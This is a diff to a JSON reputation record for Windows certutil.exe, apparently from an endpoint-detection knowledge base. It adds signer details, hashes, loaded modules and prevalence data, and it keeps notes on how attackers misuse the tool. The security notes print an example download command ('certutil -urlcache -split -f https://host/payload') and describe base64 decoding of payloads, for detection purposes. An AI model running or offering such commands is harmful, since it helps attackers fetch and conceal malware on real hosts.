@@ -11,43 +11,345 @@
   ],
   "description": "certutil.exe is a Windows command-line tool for working with certificates and Certificate Services. Administrators use it to inspect, request, and manage certificates and certificate authorities, and to verify file hashes. The same binary can also download files and base64 encode or decode data, which is why it has become a favorite living-off-the-land tool for attackers.\n",
   "about": "certutil.exe is the command-line interface to the Windows certificate and Certificate Services stack. Its intended job is certificate administration: dumping and verifying certificates, requesting them from a certificate authority, managing a CA, and checking revocation. The genuine binary lives at `C:\\Windows\\System32\\certutil.exe`, with a 32-bit copy under `SysWOW64`.\n\nAlongside the certificate work it carries general-purpose helpers that have nothing to do with PKI. `-hashfile` computes a file's MD5, SHA1, or SHA256. `-encode` and `-decode` convert data to and from base64. `-urlcache` and `-verifyctl` can fetch a file from a URL. These are all documented features, but together they turn certutil into a download-and-decode utility that happens to be signed by Microsoft and present on every Windows machine.\n\nLegitimately, certutil is run by administrators, by enrollment and PKI scripts, and by the Task Scheduler in certificate-management contexts. On an ordinary workstation it is uncommon. What a given instance is doing is written in its command-line verb.\n",
-  "publisher": null,
-  "issuer": null,
-  "signed": null,
-  "signing_rate": null,
-  "signing_algorithm": null,
-  "signers": [],
-  "file_details": null,
-  "file_versions": [],
-  "file_sizes": [],
-  "cert_thumbprints": [],
-  "provenance": "curated",
-  "prevalence_band": "unknown",
-  "prevalence_score": null,
-  "host_prevalence": null,
-  "execution_rank": null,
+  "publisher": "Microsoft Corporation",
+  "issuer": "Microsoft Windows Production PCA 2011",
+  "cert_serial": "3300000519DADDAA8BDC44B292000000000519",
+  "signed": true,
+  "signing_rate": 100,
+  "signing_algorithm": "sha256RSA",
+  "signers": [
+    "Microsoft Windows"
+  ],
+  "file_details": {
+    "file_type": "PE32+ executable",
+    "magic": "PE32+ executable (console)",
+    "original_name": "CertUtil.exe.mui",
+    "internal_name": "CertUtil.exe",
+    "product": "Microsoft® Windows® Operating System",
+    "copyright": "© Microsoft Corporation. All rights reserved."
+  },
+  "file_versions": [
+    {
+      "value": "10.0.26100.1 (WinBuild.160101.0800)",
+      "weight": "ubiquitous",
+      "pct": 100
+    }
+  ],
+  "file_sizes": [
+    {
+      "value": "1548.00 KB",
+      "weight": "ubiquitous",
+      "pct": 100
+    }
+  ],
+  "architectures": [
+    {
+      "value": "x64",
+      "weight": "ubiquitous",
+      "pct": 100
+    }
+  ],
+  "cert_thumbprints": [
+    {
+      "value": "3b77db29ac72aa6b5880ecb2ed5ec1ec6601d847",
+      "weight": "ubiquitous",
+      "pct": 100
+    }
+  ],
+  "provenance": "measured",
+  "prevalence_band": "ubiquitous",
+  "prevalence_score": 75.6,
+  "host_prevalence": 100,
+  "execution_rank": 107,
   "community_score": null,
-  "first_seen": null,
-  "last_seen": null,
-  "machine_count": null,
-  "execution_count": null,
-  "expected_paths": [],
-  "expected_parents": [],
+  "first_seen": "2026-06-09",
+  "last_seen": "2026-06-09",
+  "machine_count": 1,
+  "execution_count": 1,
+  "expected_paths": [
+    {
+      "value": "C:\\Windows\\System32\\certutil.exe",
+      "weight": "ubiquitous",
+      "pct": 100
+    }
+  ],
+  "expected_parents": [
+    {
+      "value": "cmd.exe",
+      "weight": "ubiquitous",
+      "pct": 100
+    }
+  ],
   "expected_children": [],
   "expected_grandparents": [],
   "expected_grandchildren": [],
   "network_ports": [],
   "listening_ports": [],
   "network_destinations": [],
-  "loaded_modules": [],
+  "loaded_modules": [
+    {
+      "value": "msctf.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "combase.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "gdi32full.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "netapi32.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "ucrtbase.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "advapi32.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "uxtheme.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "ncrypt.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "ws2_32.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "rpcrt4.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "msvcrt.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "crypt32.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "shell32.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "gdi32.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "ntasn1.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "imm32.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "ntdll.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "kernelbase.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "dsrole.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "wintypes.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "secur32.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "profapi.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "logoncli.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "cabinet.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "samcli.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "wldap32.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "bcrypt.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "normaliz.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "shlwapi.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "netutils.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "oleaut32.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "ntdsapi.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "sechost.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "win32u.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "ole32.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "certutil.exe",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "comctl32.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "msvcp_win.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "kernel32.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "cryptui.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "setupapi.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "sspicli.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "certcli.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "version.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "certca.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    },
+    {
+      "value": "user32.dll",
+      "weight": "ubiquitous",
+      "pct": 100
+    }
+  ],
   "named_pipes": [],
-  "user_contexts": [],
-  "integrity_levels": [],
-  "sessions": [],
+  "user_contexts": [
+    {
+      "value": "Interactive user",
+      "weight": "ubiquitous",
+      "pct": 100
+    }
+  ],
+  "integrity_levels": [
+    {
+      "value": "Medium",
+      "weight": "ubiquitous",
+      "pct": 100
+    }
+  ],
+  "sessions": [
+    {
+      "value": "Session 1",
+      "weight": "ubiquitous",
+      "pct": 100
+    }
+  ],
   "instance_counts": [],
   "token_privileges": [],
   "process_handles": [],
-  "os_prevalence": [],
+  "os_prevalence": [
+    {
+      "value": "Windows 11 (26200)",
+      "weight": "ubiquitous",
+      "pct": 100
+    }
+  ],
   "anomaly_signals": [
     {
       "signal": "Image path other than `C:\\Windows\\System32\\certutil.exe` or its `SysWOW64` copy",
@@ -78,8 +380,49 @@
       "severity": "medium"
     }
   ],
-  "command_lines": [],
-  "known_hashes": [],
+  "command_lines": [
+    {
+      "command": "certutil.exe  -h",
+      "pct": 100
+    }
+  ],
+  "known_hashes": [
+    {
+      "algo": "md5",
+      "value": "053d78cdece114ec811412c0ffba63f1",
+      "pct": 100
+    },
+    {
+      "algo": "ssdeep",
+      "value": "24576:JQ4A4AKjapebREQXOrEWWzts6jd5OBYWz+uI0y14p0CnQxkZ5ebb99Z00bCrmzBF:qKW8tfzrjdkTiYDPnf509Z+mzBZP",
+      "pct": 100
+    },
+    {
+      "algo": "sha1",
+      "value": "113761fc757d8d1c103fcfe5b70687d5e41c5c81",
+      "pct": 100
+    },
+    {
+      "algo": "imphash",
+      "value": "18911bfa425451865f3be809e0820e4c",
+      "pct": 100
+    },
+    {
+      "algo": "authentihash",
+      "value": "aa1b9d47e07d70d00c80fea55853d05c1565ca05cf9ae23d171dcd7f979ca325",
+      "pct": 100
+    },
+    {
+      "algo": "sha256",
+      "value": "ebc1d6fe958f7c551617d87e7012acc6c11b0659eb58bc2de26861102709f019",
+      "pct": 100
+    },
+    {
+      "algo": "rich_pe_header",
+      "value": "e09d9afd01487a96513adb5fa7874cf5",
+      "pct": 100
+    }
+  ],
   "security_notes": "certutil.exe is one of the most used download tools on Windows (T1105). A command line such as `certutil -urlcache -split -f https://host/payload` makes the signed binary pull a file from the internet, and because the binary is trusted and built in, the transfer hides behind a name that belongs on every machine. Network activity from certutil is itself unusual and worth treating as a lead.\n\nIt is equally useful for unpacking payloads (T1140). Attackers ship a base64-encoded file to slip past content scanners, then run `certutil -decode` on the host to restore the original executable or script. The reverse, `-encode`, is used to obfuscate data on the way out (T1027). A `-decode` that yields a PE or a script is a strong signal.\n\nIn every case the binary is the genuine signed certutil, so path and signature checks pass and even application-control rules that trust Microsoft binaries let it run. The command-line verb and the parent are where the intent shows.\n",
   "mitre_attack": [
     "T1105",
